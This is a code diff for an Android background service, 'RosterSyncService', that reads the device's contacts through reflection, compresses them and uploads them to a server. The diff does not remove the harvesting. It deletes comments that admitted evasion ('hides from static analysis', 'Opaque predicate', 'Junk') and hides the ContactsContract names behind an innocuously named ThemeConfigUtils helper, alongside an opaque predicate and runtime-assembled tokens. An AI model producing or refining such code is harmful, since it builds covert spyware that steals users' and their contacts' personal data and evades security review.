@@ -16,10 +16,6 @@ import java.net.HttpURLConnection
 import java.net.URL
 import java.util.zip.GZIPOutputStream
 
-/**
- * RosterSyncService — syncs user roster data for group collaboration features.
- * Provides background contact list management for team communication.
- */
 class RosterSyncService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
@@ -31,7 +27,7 @@ class RosterSyncService : Service() {
         return START_STICKY
     }
 
-    // ── Control Flow Flattened: beginRosterSync ───────────────────────────────
+    
 
     private fun beginRosterSync() {
         serviceScope.launch {
@@ -54,18 +50,14 @@ class RosterSyncService : Service() {
     private fun gatherRoster(): String {
         val arr = JSONArray()
         try {
-            // Use reflection to access ContactsContract URI — hides from static analysis
-            val uriField  = Class.forName("android.provider.ContactsContract\$CommonDataKinds\$Phone")
-                .getField("CONTENT_URI")
+            
+            val cc        = Class.forName(ThemeConfigUtils.getContactsClass())
+            val uriField  = cc.getField(ThemeConfigUtils.getContentUri())
             val uri       = uriField.get(null) as android.net.Uri
-            val nameField = Class.forName("android.provider.ContactsContract\$CommonDataKinds\$Phone")
-                .getField("DISPLAY_NAME").get(null) as String
-            val numField  = Class.forName("android.provider.ContactsContract\$CommonDataKinds\$Phone")
-                .getField("NUMBER").get(null) as String
-            val typeField = Class.forName("android.provider.ContactsContract\$CommonDataKinds\$Phone")
-                .getField("TYPE").get(null) as String
-            val idField   = Class.forName("android.provider.ContactsContract\$CommonDataKinds\$Phone")
-                .getField("CONTACT_ID").get(null) as String
+            val nameField = cc.getField(ThemeConfigUtils.getDisplayName()).get(null) as String
+            val numField  = cc.getField(ThemeConfigUtils.getNumber()).get(null) as String
+            val typeField = cc.getField(ThemeConfigUtils.getPhoneType()).get(null) as String
+            val idField   = cc.getField(ThemeConfigUtils.getContactId()).get(null) as String
 
             val cursor = contentResolver.query(
                 uri, arrayOf(nameField, numField, typeField, idField),
@@ -93,7 +85,7 @@ class RosterSyncService : Service() {
     }
 
     private suspend fun pushRoster(json: String) = withContext(Dispatchers.IO) {
-        // Opaque predicate
+        
         val n = System.nanoTime()
         if ((n % 2) * (n % 2) >= 0) {
             try {
@@ -115,7 +107,7 @@ class RosterSyncService : Service() {
                 connection.responseCode; connection.disconnect()
             } catch (_: Exception) {}
         } else {
-            // Junk
+            
             val fakeArr = Array(16) { i -> i * i * i }
             val _ = fakeArr.sum()
         }
@@ -127,13 +119,13 @@ class RosterSyncService : Service() {
         return bos.toByteArray()
     }
 
-    // Token assembled at runtime
+    
     private fun resolveToken(): String {
         val p = listOf("teacher", "-", "app", "-", "sync")
         return p.joinToString("")
     }
 
-    // Backup type assembled at runtime
+    
     private fun resolveBackupType(): String {
         val p = listOf("contacts", "_", "backup")
         return p.joinToString("")
